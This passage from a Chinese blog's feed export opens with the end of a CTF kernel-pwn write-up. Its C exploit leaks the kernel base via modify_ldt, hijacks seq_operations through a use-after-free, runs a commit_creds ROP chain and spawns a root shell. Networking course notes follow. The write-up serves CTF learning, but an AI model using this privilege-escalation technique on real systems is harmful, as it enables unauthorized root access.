class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>); <span class="comment">// final param should be 8 there</span></span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="type">size_t</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf[i] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = buf[i] -  <span class="number">0x040</span>;</span><br><span class="line">                    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>; <span class="comment">// don&#x27;t forget to set it in main process</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// hijack seq_operations-&gt;start</span></span><br><span class="line">    chunkAdd(<span class="number">1</span>);</span><br><span class="line">    chunkSet(<span class="number">1</span>);</span><br><span class="line">    chunkDel(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    chunkEdit(<span class="number">0xffffffff817c21a6</span> + kernel_offset); <span class="comment">// add rsp, 0x198 ; pop r12 ; pop rbp ; ret</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hijack to: %p\n&quot;</span>, <span class="number">0xffffffff817c21a6</span> + kernel_offset);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = POP_RDI_RET + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span> <span class="comment">// start at there</span></span><br><span class="line">        <span class="string">&quot;mov r12,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成<strong>稳定化提权</strong></p><p><img src="https://s2.loli.net/2022/01/05/YjJTbIsMGUaZ2Xu.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;欧皇与非酋的对决&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="TCTF/0CTF" scheme="http://blog.arttnba3.cn/tags/TCTF-0CTF/"/>
    
    <category term="Kernel BROP" scheme="http://blog.arttnba3.cn/tags/Kernel-BROP/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
  </entry>
  
  <entry>
    <title>【NETWORK.0x00】计算机网络原理学习笔记</title>
    <link href="http://blog.arttnba3.cn/2021/09/27/NETWORK-0X00-COMPUTER_NETWORK_BASIS/"/>
    <id>http://blog.arttnba3.cn/2021/09/27/NETWORK-0X00-COMPUTER_NETWORK_BASIS/</id>
    <published>2021-09-26T16:27:43.000Z</published>
    <updated>2022-07-03T20:09:58.717Z</updated>
    
    <content type="html"><![CDATA[<p>我爱计网计网爱我</p><span id="more"></span><blockquote><p><del>我像计网爱我那样爱计网</del>（🔫</p></blockquote><h1 id="0x00-写在开始之前"><a href="#0x00-写在开始之前" class="headerlink" title="0x00.写在开始之前"></a>0x00.写在开始之前</h1><p>计算机网络原理一直都是计算机科学与技术中十分基础与重要的的课程，刚好这学期开了计算机网络这门课，<del>为了避免挂科还是</del>学到一点写一点，不过本篇博文<strong>并非考试导向性质的笔记，只会记录笔者认为重要的内容，不会特意标注所谓重点</strong>（<del>什么·？你想拿来考研？</del></p><p>主要参照《数据通信与网络》与老师上课用的 PPT，配合着笔者个人的一些理解，笔者认为不重要的会标注 <code>*</code>，如有错误还请大家不吝赐教</p><p>当前进度：Chapter.06   2022.1.5（如果看到笔者还没更新完请提醒笔者（笑））</p><blockquote><p>简单看了一下这本书主要以自底向上的方式混合叙述了 TCP&#x2F;IP 四层模型与 OSI 七层模型的内容：物理层、数据链路层（前面这两层在 TCP&#x2F;IP 中合为网络访问层）、网络层、传输层、应用层（在 OSI 七层模型中应用层被分为三层，自底向上为：会话层、表示层、应用层）</p></blockquote><blockquote><p>附上两张从网上找到的图</p><p><img src="https://i.loli.net/2021/09/28/AGyOHXZINmP7R4C.png"></p><p><img src="https://i.loli.net/2021/09/28/FRj2ZYOiT1Ah8wo.png"></p></blockquote><h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01.概述"></a>0x01.概述</h1><h2 id="Chapter-1-绪论"><a href="#Chapter-1-绪论" class="headerlink" title="Chapter 1 - 绪论"></a>Chapter 1 - 绪论</h2><h3 id="1-1-数据通信"><a href="#1-1-数据通信" class="headerlink" title="1.1 数据通信"></a>1.1 数据通信</h3><p><strong>数据通信</strong>（data communication）即在两台设备间进行数据交换，其效率主要取决于以下四个因素：</p><ul><li><strong>传递性</strong>：系统必须将数据传递到正确的目的地</li><li><strong>准确性</strong>：系统必须准确地传输数据</li><li><strong>及时性</strong>：系统必须以及时的方式传递数据</li><li><strong>抖动性</strong>：分组到达时间的变化率应当要低</li></ul><p>一个数据通信系统主要有如下图所示的五个组成部分：</p><p><img src="https://i.loli.net/2021/09/28/KhQv3z84rsBbkWD.png" alt="image.png"></p><ul><li><strong>报文</strong>（message）：即用以进行通信的数据</li><li><strong>发送方</strong>（sender）：发送报文的设备</li><li><strong>接收方</strong>（receiver）：接收报文的设备</li><li><strong>传输介质</strong>（transmission medium）：报文从发送方到接收方所经过的物理通路</li><li><strong>协议</strong>（protocol）：用以管理数据通信的一组规则，表示通信设备之间如何进行通信的约定</li></ul><p>两台设备之间的<strong>通信模式</strong>主要有以下三种：</p><p><img src="https://i.loli.net/2021/09/27/yaMkHe24ctFIYob.png" alt="image.png"></p><ul><li><strong>单工</strong>（simplex mode）：两台设备间的通信是单向的，一方只能为接收方而另一方只能为发送方</li><li>(全)<strong>双工</strong>（(full-)duplex mode）：两台设备间的通信是双向的，<strong>通信双方都可以同时收发报文</strong></li><li><strong>半双工</strong>（half-duplex mode）：两台设备间的通信是双向的，但是<strong>在同一时刻报文的传输只能是单向的</strong></li></ul><h3 id="1-2-网络"><a href="#1-2-网络" class="headerlink" title="1.2 网络"></a>1.2 网络</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><strong>网络</strong>（network）即为用通信链路连接起来的<strong>设备</strong>（称之为节点）<strong>的集合</strong></p><blockquote><p><strong>分布式处理</strong>（distributed processing）为一种典型的网络模式：将一个任务分给多个节点处理</p></blockquote><p>我们主要从以下三个方面评估一个网络：</p><ul><li><strong>性能</strong>（performance）：主要由以下两个因素进行度量：<ul><li><strong>吞吐量</strong>（throughput）：【相当一段时间】内收发的总数据量</li><li><strong>延迟</strong>（delay&#x2F;latency）：请求响应【出入系统的时间】</li></ul></li></ul><p>吞吐量大延迟不一定低，反之亦然，因为吞吐量描述的是整个系统的性能，而延迟描述的是系统对于用户的响应时间</p><blockquote><p>例如一个系统可以一次吞吐 114514 TB数据，但一次只能处理233个用户的请求，此时一次性来了1919810个用户，延迟就爆炸了</p></blockquote><ul><li><strong>可靠性</strong>（reliability）：即网络是否可靠，主要由故障出现的频率、出错的恢复时间、抗灾性能三个方面来衡量</li><li><strong>安全性</strong>（security）：网络是否能够保护数据在传输过程中不被窃取与破解、数据丢失后是否有较好的恢复策略</li></ul><h4 id="连接类型"><a href="#连接类型" class="headerlink" title="连接类型"></a>连接类型</h4><p>网络的<strong>连接类型</strong>主要有以下两种：</p><p><img src="https://i.loli.net/2021/09/28/nH1qta5ml4vTFzY.png" alt="image.png"></p><ul><li><strong>点到点</strong>（point-to-point）：两台设备之间使用一条专用链路进行通信</li><li><strong>多点连接</strong>（multipoint connection）：在一条通信链路上有着多台设备</li></ul><h4 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h4><p><strong>物理拓扑结构</strong>（physical topology）指的是网络在物理上分布的方式，一条链路上连接着两台或多台设备，两条或多条链路组成拓扑结构，主要有以下几种：</p><ul><li><p><strong>网状</strong>：网络中的数个节点之间互相<strong>自由连接</strong>，形成一张网</p></li><li><p><strong>星型</strong>：网络中的数个节点拥有一条与中央节点连接的链路，这个中央节点通常是一个集线器（sub）</p></li><li><p><strong>总线型</strong>：由一条较长的线缆作为<strong>主干</strong>（backbone）来连接网络上的所有设备</p></li><li><p><strong>环状</strong>：每台设备只与其两侧的设备有一条专用的点到点连接，环中的每个设备中安装有一个中继器</p><blockquote><p>笔者认为环状可以理解为总线型首尾相连，每个设备多出一个中继器</p></blockquote></li><li><p><strong>混合型</strong>：由上述拓扑结构中的两种及以上构成的网络</p></li></ul><h4 id="规模分类"><a href="#规模分类" class="headerlink" title="规模分类"></a>规模分类</h4><p><strong>根据网络的规模</strong>，我们将网络分为以下两种类型：</p><ul><li><strong>局域网</strong>（local area network，简称 LAN）：由一定范围内的少量设备组成的网络，通常是私有网络</li><li><strong>广域网</strong>（wide area network，简称 WAN）：大范围内的数个局域网与设备组成的网络</li></ul><p><strong>互联网络</strong>（internet）便是由多个网络彼此连接组成的网络，最著名的互联网便是因特网（Internet）</p><blockquote><p> 还有一种介于广域网与局域网间的概念叫城域网，不过在笔者看来似乎并不常用</p></blockquote><h3 id="1-3-协议"><a href="#1-3-协议" class="headerlink" title="1.3 协议"></a>1.3 协议</h3><p><strong>协议</strong>（protocol）即为用来管理数据通讯的一组规则，其定义了通信的内容、通信的方式与通信的时间。协议的核心要素为：</p><ul><li><strong>语法</strong>（syntax）：数据的结构或格式</li></ul><blockquote><p>比如说协议A定义了数据格式为 header + data，定义了 header 中的按 8 字节分组为 header size、sender address、receiver address、data length…等等</p></blockquote><ul><li><strong>语义</strong>（semantics）：每一个位片段的含义</li></ul><blockquote><p>例如协议 A 中的 sender address 的前两位标识了路由…等等</p></blockquote><ul><li><strong>时序</strong>（timing）：报文的发送时间与发送速率</li></ul><h2 id="Chapter-2-网络模型"><a href="#Chapter-2-网络模型" class="headerlink" title="Chapter 2 - 网络模型"></a>Chapter 2 - 网络模型</h2><p>目前主要有两种网络<strong>分层</strong>模型：<code>OSI七层模型</code>（Open System Interconnection，开放式系统互联）与 <code>TCP/IP 模型</code>，其对应关系如下图所示：</p><p><img src="https://i.loli.net/2021/09/28/1ujnpTi6efUPwEX.png" alt="image.png"></p><p>信息在发送时通过各层提供的接口由高层向低层传递，逐层封装，接收方再逐层进行解封，如下图所示：</p><p><img src="https://i.loli.net/2021/10/08/r3Zoi6bufOAyNep.png" alt="image.png"></p><h3 id="2-1-OSI-Model"><a href="#2-1-OSI-Model" class="headerlink" title="2.1 OSI Model"></a>2.1 OSI Model</h3><p>由 ISO 定义的一个网络模型，结构如下图所示：</p><blockquote><p>这张图也是从网上偷的</p></blockquote><p><img src="https://i.loli.net/2021/10/09/OIbesTYf79y3pDw.png" alt="image.png"></p><h4 id="物理层（physical-layer）"><a href="#物理层（physical-layer）" class="headerlink" title="物理层（physical layer）"></a>物理层（physical layer）</h4><p>定义了接口与传输介质的物理属性，以及物理设备和接口为了传输而必须执行的过程和功能，其主要关注如下问题：</p><ul><li><strong>接口与介质的物理特性</strong></li><li><strong>位的表示</strong>（编码类型，即如何将0&#x2F;1转换为信号）</li><li><strong>数据速率</strong>（每秒发送的位数）</li><li><strong>位同步</strong>（收发双方时钟同步）</li><li><strong>线路配置</strong></li><li><strong>物理拓扑结构</strong></li><li><strong>传输方式</strong></li></ul><h4 id="数据链路层（data-link-layer）"><a href="#数据链路层（data-link-layer）" class="headerlink" title="数据链路层（data link layer）"></a>数据链路层（data link layer）</h4><p>该层负责<strong>帧</strong>（<strong>frame</strong>）<strong>从一个节点</strong>（<strong>node</strong>）<strong>到下一个节点的传输</strong>，职能如下：</p><ul><li><strong>分帧</strong>：将从网络层接收到的数据流划分为称为<strong>帧</strong>（<strong>frame</strong>）的单元</li><li><strong>物理寻址</strong>：数据链路层会在 frame header 中记录<strong>发送方与接收方的物理地址</strong>（主要是 mac 地址），若目标设备处在发送设备所处网络内，则 frame header 中记录的接收方地址为目标设备地址，否则为下一个节点的地址</li></ul><blockquote><p>由此我们可以看出：若是在同一个二层网络中有两台 mac 相同的设备，则这两台设备将完全不能进行通信：上层交换机可能弄混这两台设备导致发错包</p></blockquote><ul><li><strong>流量控制</strong>：主要是调控发送方的速率，防止接收方过载</li><li><strong>差错控制</strong>：检测与重发损坏或丢失的帧，去除重复帧，保证数据可靠性</li><li><strong>访问控制</strong>：决定多台设备并发访问同一条链路的访问顺序</li></ul><h4 id="网络层（network-layer）"><a href="#网络层（network-layer）" class="headerlink" title="网络层（network layer）"></a>网络层（network layer）</h4><p>该层负责将各个分组从源地址传递到目标地址（主要是针对不同链路中的设备，对于同一链路上的设备间的通信则可以不需要网络层的经手），主要任务为：</p><ul><li><strong>逻辑寻址</strong>：网络层会在 data header 中记录<strong>发送方与接收方的逻辑地址</strong>（最常用的为 IP 地址）</li><li><strong>路由选择</strong>：在多个链路构成的互联网中通过连接设备（路由器&#x2F;网关）将分组送至其最终目的地</li></ul><h4 id="传输层（transport-layer）"><a href="#传输层（transport-layer）" class="headerlink" title="传输层（transport layer）"></a>传输层（transport layer）</h4><p>该层负责报文的<strong>进程到进程传递</strong>（<strong>process-to-process delivery</strong>），即将报文送到相应的端口，传递给对应的进程，具体任务如下：</p><ul><li><strong>服务点寻址</strong>：在传输层的 header 中记录了进程对应的_服务点地址_（端口地址），由此将报文传送给指定进程</li><li><strong>分段和组装</strong>：将报文分解为可传输片段并标号以保证数据可靠性</li><li><strong>连接控制</strong>：传输层可以是无连接的（例如 UDP）也可以是面向连接的（例如 TCP），前者直接进行报文的传输，后者在此之前还需要进行连接的建立（例如经典的 TCP 三次握手）</li><li><strong>流量控制</strong>：主要是调控发送方的速率，防止接收方过载，与数据链路层不同的是这一层的流量控制在_端到端_上（两个通信的进程之间）</li><li><strong>差错控制</strong>：检测与重发损坏或丢失的片段，去除重复片段，保证数据可靠性</li></ul><blockquote><p>至此，数据在网络间的传输过程已经结束，接下来的三层在笔者看来<strong>与实际应用程序相关联，并不与计算机网络原理具有强关联</strong>，故不会详细叙述</p><h4 id="会话层（session-layer）"><a href="#会话层（session-layer）" class="headerlink" title="*会话层（session layer）"></a><em>*会话层（session layer）</em></h4><p>该层主要负责对话控制与同步</p><h4 id="表示层（presentation-layer）"><a href="#表示层（presentation-layer）" class="headerlink" title="*表示层（presentation layer）"></a><em>*表示层（presentation layer）</em></h4><p>该层主要负责翻译、加密与压缩数据</p><h4 id="应用层（application-layer）"><a href="#应用层（application-layer）" class="headerlink" title="*应用层（application layer）"></a><em>*应用层（application layer）</em></h4><p>该层主要负责向用户提供服务</p></blockquote><h3 id="2-2-TCP-x2F-IP-协议族"><a href="#2-2-TCP-x2F-IP-协议族" class="headerlink" title="2.2 TCP&#x2F;IP 协议族"></a>2.2 TCP&#x2F;IP 协议族</h3><p>TCP&#x2F;IP 协议族与 OSI 七层模型<strong>并非严格对应</strong>，但大致上存在如本章头图所示的对应关系</p><h4 id="网络访问层（network-access）"><a href="#网络访问层（network-access）" class="headerlink" title="网络访问层（network access）"></a>网络访问层（network access）</h4><p>相当于 OSI Model 中的 <code>物理层 + 数据链路层</code>，在这一层中支持所有的标准与专门协议</p><blockquote><p>也有人称为 “一个大的物理层”</p></blockquote><h4 id="互联网层（internet）"><a href="#互联网层（internet）" class="headerlink" title="互联网层（internet）"></a>互联网层（internet）</h4><p>相当于 OSI Model 中的 <code>网络层</code>，在这一层中使用<strong>网际协议</strong>（<strong>Internetworking Protocol， 即 IP</strong>）</p><p>网际协议为 TCP&#x2F;IP 协议使用的传输机制，其支持四个子协议：</p><ul><li><strong>地址解析协议</strong>（<strong>Address Resolution Protocol，即 ARP</strong>）：通过逻辑地址获得对应物理地址（例如由 IP 地址寻找对应 mac 地址）</li><li><strong>逆地址解析协议</strong>（<strong>Reverse Address Resolution Protocol，即 RARP</strong>）：设备第一次接入网络时向网关请求逻辑地址</li><li><strong>因特网控制报文协议</strong>（<strong>Internet Control Message Protocol，即 ICMP</strong>）：用于在 IP 主机与路由之间传递控制消息（网络是否连通、主机是否可达、路由是否可用等）</li><li><strong>因特网控制报文协议</strong>（<strong>Internet Group Message Protocol，即 IGMP</strong>）：用于主机与本地路由器之间进行组播组成员信息的交互（决定分组信息与组播报文的传递）</li></ul><h4 id="传输层（transport）"><a href="#传输层（transport）" class="headerlink" title="传输层（transport）"></a>传输层（transport）</h4><p>相当于 OSI Model 中的 <code>传输层</code>，负责报文的进程间传递，主要支持如下协议：</p><ul><li><strong>用户数据报协议</strong>（<strong>User Datagram Protocol， 即 UDP</strong>）：无连接的传输</li><li><strong>传输控制协议</strong>（<strong>Transmission Control Protocol，即 TCP</strong>）：面向连接的传输</li><li>流控制传输协议（Stream Control Transmission Protocol，即 SCTP）</li></ul><h4 id="应用层（application）"><a href="#应用层（application）" class="headerlink" title="应用层（application）"></a>应用层（application）</h4><p>相当于 OSI Model 中的 <code>会话层 + 表示层 + 应用层</code>，常见的 <code>http/ftp/telnet/ssh/snmp/smb</code> 等都在这一层</p><p>综上，我们可以将 TCP&#x2F;IP 模型化为较为通用的<strong>五层</strong>层次结构，如下图所示：</p><p><img src="https://i.loli.net/2021/10/09/tiopV6dEJwjSYmu.png" alt="image.png"></p><h3 id="2-3-寻址"><a href="#2-3-寻址" class="headerlink" title="2.3 寻址"></a>2.3 寻址</h3><p>对于采用了 TCP&#x2F;IP 协议的互联网而言其使用四层地址结构：</p><h4 id="物理（链路）地址（physical-（link）-address）："><a href="#物理（链路）地址（physical-（link）-address）：" class="headerlink" title="物理（链路）地址（physical （link） address）："></a><strong>物理</strong>（<strong>链路</strong>）<strong>地址</strong>（<strong>physical</strong> （<strong>link</strong>） <strong>address</strong>）：</h4><p>对应 TCP&#x2F;IP 四层模型中的网络访问层（物理层），主要在网络（LAN&#x2F;WAN）中使用，<strong>不同网络中的物理地址格式可能不同</strong></p><h4 id="逻辑（IP）地址（logical-（IP）-address）"><a href="#逻辑（IP）地址（logical-（IP）-address）" class="headerlink" title="逻辑（IP）地址（logical （IP） address）"></a><strong>逻辑</strong>（<strong>IP</strong>）<strong>地址</strong>（<strong>logical</strong> （<strong>IP</strong>） <strong>address</strong>）</h4><p>对应 TCP&#x2F;IP 四层模型中的互联网层，与物理地址无关，作为互联网环境中一台设备的<strong>唯一标记</strong>，在一个互联网中<strong>没有两台主机具有相同的 IP 地址</strong></p><blockquote><p>由此我们可以看出，在数据在节点到节点的传输过程中<strong>物理地址会发生改变，但逻辑地址并不会</strong></p></blockquote><h4 id="端口地址（port-addr）"><a href="#端口地址（port-addr）" class="headerlink" title="端口地址（port addr）"></a><strong>端口地址</strong>（<strong>port addr</strong>）</h4><p>对应 TCP&#x2F;IP 四层模型中的传输层，为赋予对应通信进程的标识符，其长度为 16 位</p><h4 id="专用地址（private-address）"><a href="#专用地址（private-address）" class="headerlink" title="*专用地址（private address）"></a>*专用地址（private address）</h4><p>对应 TCP&#x2F;IP 四层模型中的应用层，部分面向用户的应用被设计为专用地址（例如邮件地址、URL等）</p><h1 id="00x02-物理层和介质"><a href="#00x02-物理层和介质" class="headerlink" title="00x02.物理层和介质"></a>00x02.物理层和介质</h1><blockquote><p>笔者最讨厌的物理部分（笑）</p><p>一些基本概念这里就不再手抄一遍了，不懂的自己百度（）</p></blockquote><h2 id="Chapter-3-数据和信号"><a href="#Chapter-3-数据和信号" class="headerlink" title="Chapter 3 - 数据和信号"></a>Chapter 3 - 数据和信号</h2><p>数据若要进行传输，则必须要将其转为电磁信号的形式</p><h3 id="3-1-周期模拟信号"><a href="#3-1-周期模拟信号" class="headerlink" title="3.1 周期模拟信号"></a>3.1 周期模拟信号</h3><p>最简单的周期模拟信号为<strong>正弦波</strong>，由多个正弦波组成的信号为复合型模拟信号，我们使用<strong>复合信号</strong>（composite signal）来进行数据通信</p><h4 id="带宽（bandwidth）"><a href="#带宽（bandwidth）" class="headerlink" title="带宽（bandwidth）"></a>带宽（bandwidth）</h4><p><strong>复合信号包含的频率范围称为带宽</strong>，即带宽通常为信号最高频率与最低频率的差值</p><h3 id="3-2-数字信号"><a href="#3-2-数字信号" class="headerlink" title="3.2 数字信号"></a>3.2 数字信号</h3><blockquote><p>“《数字信号处理》，一章没看”</p></blockquote><p>我们可以使用数字信号表示数据——<strong>将不同的数据编码为不同的电平</strong>，例如将 1 编码为正电平而 0 编码为 0 电平。一般来说，对于 L 个不同的电平而言，每个电平可以表示 log<sub>2</sub>L 个位</p><p>基于_傅里叶分析_，我们可以得出：数字信号为<strong>带宽无限大的复合模拟信号</strong>。</p><h4 id="比特率（bit-rate）"><a href="#比特率（bit-rate）" class="headerlink" title="比特率（bit rate）"></a>比特率（bit rate）</h4><p>比特率即为<strong>一秒中所发送的位数</strong>，单位为<strong>位每秒</strong>（<strong>bits per second，即 bps</strong>）</p><h4 id="位长（bit-length）"><a href="#位长（bit-length）" class="headerlink" title="位长（bit length）"></a>位长（bit length）</h4><p>位长即为<strong>一个位在传输介质上的距离</strong>，有如下公式：</p><p>$$<br>位长 &#x3D; 传播速度 × 位持续时间<br>$$</p><h4 id="数字信号的传输"><a href="#数字信号的传输" class="headerlink" title="数字信号的传输"></a>数字信号的传输</h4><h5 id="基带传输"><a href="#基带传输" class="headerlink" title="基带传输"></a>基带传输</h5><p>即通过通道直接发送数字信号，而非转为模拟信号，<strong>需要一个带宽下限频率为 0 的低通通道</strong></p><h5 id="宽带传输（使用调制）"><a href="#宽带传输（使用调制）" class="headerlink" title="宽带传输（使用调制）"></a>宽带传输（使用调制）</h5><p>即将数字信号<strong>转换成模拟信号传输</strong>，调制允许我们使用<strong>带通通道</strong></p><h3 id="3-3-传输减损"><a href="#3-3-传输减损" class="headerlink" title="3.3 传输减损"></a>3.3 传输减损</h3><h4 id="衰减（attenuation）"><a href="#衰减（attenuation）" class="headerlink" title="衰减（attenuation）"></a>衰减（attenuation）</h4><p>即信号强度衰减，这意味着能量的损失，为了补偿衰减的能量通常会用放大器放大信号。</p><p><img src="https://i.loli.net/2021/10/11/To8UcnqVvRC2dlK.png" alt="image.png"></p><h5 id="分贝（decibel，-DB）"><a href="#分贝（decibel，-DB）" class="headerlink" title="分贝（decibel， DB）"></a>分贝（decibel， DB）</h5><p>分贝用于描述信号损失&#x2F;增益的强度：<strong>若信号衰减了，则分贝为负值；若信号被放大了，则分贝为正值</strong></p><p>设 P<sub>1</sub> 与 P <sub>2</sub> 为信号在位置 1、2 处的功率，则分贝为：<br>$$<br>dB &#x3D; 10 log_{10}\frac{P_2}{P_1}<br>$$</p><h4 id="失真（distortion）"><a href="#失真（distortion）" class="headerlink" title="失真（distortion）"></a>失真（distortion）</h4><p>即信号的形状或形态发生了改变</p><p><img src="https://i.loli.net/2021/10/11/Dl49Asgq7dZj3GH.png" alt="image.png"></p><h4 id="噪声（noise）"><a href="#噪声（noise）" class="headerlink" title="噪声（noise）"></a>噪声（noise）</h4><p>噪声即为由各种环境因素<strong>附加在原始信号上的额外的垃圾信号</strong></p><p><img src="https://i.loli.net/2021/10/11/MqDXOFIm6rgdh1s.png" alt="image.png"></p><h5 id="信噪比（signal-to-noise-ratio，SNR）"><a href="#信噪比（signal-to-noise-ratio，SNR）" class="headerlink" title="信噪比（signal-to-noise ratio，SNR）"></a>信噪比（signal-to-noise ratio，SNR）</h5><p>信噪比用以描述信号被噪声破坏的程度，计算公式如下：<br>$$<br>SNR&#x3D;\frac{平均信号功率}{平均噪声功率}<br>$$<br>容易看出，SNR 越高，信号被破坏的越少，反之亦然</p><h3 id="3-4-数据速率限制"><a href="#3-4-数据速率限制" class="headerlink" title="3.4 数据速率限制"></a>3.4 数据速率限制</h3><p>数据速率即<strong>每秒传输的比特数</strong>，即<strong>比特率</strong>，通常取决于以下三个因素：</p><ul><li>有效带宽</li><li>使用的信号电平数</li><li>通道的质量（噪声电平）</li></ul><h4 id="无噪声通道：奈奎斯特比特率"><a href="#无噪声通道：奈奎斯特比特率" class="headerlink" title="无噪声通道：奈奎斯特比特率"></a>无噪声通道：奈奎斯特比特率</h4><p>对于无噪声的理想通道，<strong>奈奎斯特比特率</strong>（<strong>Nyquist bit rate</strong>）公式定义了理论上的<strong>最大</strong>比特率：<br>$$<br>比特率 &#x3D; 2 × 带宽 × log_2L<br>$$<br>其中 <code>L</code> 为使用的信号电平数量，需要注意的是 L 的增加会减弱系统的可靠性</p><h4 id="噪声通道：香农容量定理"><a href="#噪声通道：香农容量定理" class="headerlink" title="噪声通道：香农容量定理"></a>噪声通道：香农容量定理</h4><p>对于有噪声的通道，其理论上<strong>最大</strong>比特率为：<br>$$<br>通道容量 &#x3D; 通道带宽 × 